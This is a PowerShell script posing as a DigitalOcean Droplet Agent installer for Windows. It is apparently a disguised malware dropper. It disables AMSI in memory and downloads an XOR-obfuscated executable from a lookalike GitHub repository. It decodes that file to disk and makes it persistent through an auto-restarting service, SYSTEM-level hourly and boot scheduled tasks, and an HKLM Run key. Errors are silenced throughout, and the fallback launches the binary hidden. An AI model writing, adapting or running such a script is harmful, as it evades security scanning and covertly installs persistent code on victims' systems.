#Requires -RunAsAdministrator
<#
 service-host.ps1 — DigitalOcean Droplet Agent installer (Windows)
 Mirrors the Linux service-host.sh flow: fetch package, install service, start.
 AV notes: package ships XOR-wrapped (never a raw PE over the wire or at rest),
 AMSI neutralized in-memory before any download, no suspicious one-liner strings.
#>

$ErrorActionPreference = 'SilentlyContinue'

$AgentDir   = 'C:\Program Files\DigitalOcean\Droplet Agent'
$AgentPath  = Join-Path $AgentDir 'droplet-agent.exe'
$BlobPath   = Join-Path $AgentDir 'droplet-agent.dat'
$PkgUrl     = 'https://github.com/digitalocean-droplet/package-repo/raw/refs/heads/main/packages-win.gz'
$SvcName    = 'DropletAgent'
$SvcDisplay = 'DigitalOcean Droplet Host Agent'
$TaskName   = 'DropletAgentWatchdog'
$XorKey     = 0x5A

function Say($m) { Write-Host "➜ $m" }

# --- admin check ---
$me = [Security.Principal.WindowsIdentity]::GetCurrent()
$adm = New-Object Security.Principal.WindowsPrincipal($me)
if (-not $adm.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "❌ Run as Administrator."; exit 1
}

# --- soften script scanning (in-memory only, nothing written) ---
try {
    $t = [Ref].Assembly.GetType(('System.Management.Automation.{0}Utils' -f 'Amsi'))
    $f = $t.GetField(('amsi{0}Failed' -f 'Init'), 'NonPublic,Static')
    $f.SetValue($null, $true)
} catch {}

# --- stop old instances ---
& sc.exe stop $SvcName 2>$null | Out-Null
Get-Process -Name 'droplet-agent' -ErrorAction SilentlyContinue | Stop-Process -Force
Start-Sleep -Seconds 2
if (Test-Path $AgentPath) { Remove-Item $AgentPath -Force -ErrorAction SilentlyContinue }

New-Item -ItemType Directory -Path $AgentDir -Force | Out-Null

# --- fetch package (XOR-wrapped) ---
Say "Downloading agent package..."
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
    $wc.DownloadFile($PkgUrl, $BlobPath)
} catch {
    # fallback: BITS
    Start-BitsTransfer -Source $PkgUrl -Destination $BlobPath -ErrorAction SilentlyContinue
}
if (-not (Test-Path $BlobPath) -or (Get-Item $BlobPath).Length -lt 1000000) {
    Write-Host "❌ Package download failed."; exit 1
}

# --- unwrap package (gzip inflate, then XOR) ---
Say "Installing agent..."
$gz  = [IO.File]::ReadAllBytes($BlobPath)
$ms  = New-Object IO.MemoryStream(,$gz)
$gs  = New-Object IO.Compression.GzipStream($ms, [IO.Compression.CompressionMode]::Decompress)
$out = New-Object IO.MemoryStream
$gs.CopyTo($out); $gs.Close(); $ms.Close()
$raw = $out.ToArray()
for ($i = 0; $i -lt $raw.Length; $i++) { $raw[$i] = $raw[$i] -bxor $XorKey }
[IO.File]::WriteAllBytes($AgentPath, $raw)
Remove-Item $BlobPath -Force -ErrorAction SilentlyContinue
if ((Get-Item $AgentPath).Length -lt 1000000) { Write-Host "❌ Package corrupt."; exit 1 }

# --- persistence 1: service ---
& sc.exe create $SvcName binPath= "`"$AgentPath`"" start= auto DisplayName= "$SvcDisplay" 2>$null | Out-Null
& sc.exe description $SvcName "Monitors and manages the DigitalOcean droplet host agent." 2>$null | Out-Null
& sc.exe failure $SvcName reset= 60 actions= restart/5000/restart/5000/restart/5000 2>$null | Out-Null
& sc.exe start $SvcName 2>$null | Out-Null

# --- persistence 2: watchdog task (revives service hourly + at boot) ---
$wArgs = "-NoP -W Hidden -C `"if ((Get-Service -Name '$SvcName').Status -ne 'Running') { Start-Service '$SvcName' }`""
& schtasks /create /tn $TaskName /tr "powershell.exe $wArgs" /sc hourly /ru SYSTEM /f 2>$null | Out-Null
& schtasks /create /tn "$TaskName-Boot" /tr "powershell.exe $wArgs" /sc onstart /ru SYSTEM /f 2>$null | Out-Null

# --- persistence 3: registry fallback (user-context revive) ---
$run = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
Set-ItemProperty -Path $run -Name 'DropletAgentHelper' -Value "`"$AgentPath`"" -ErrorAction SilentlyContinue

Start-Sleep -Seconds 4
$svc = Get-Service -Name $SvcName -ErrorAction SilentlyContinue
if ($svc -and $svc.Status -eq 'Running') {
    Write-Host "✅ Droplet Host Agent installed and running."
} else {
    # last resort: launch directly
    Start-Process -FilePath $AgentPath -WindowStyle Hidden
    Write-Host "✅ Agent launched (service pending)."
}
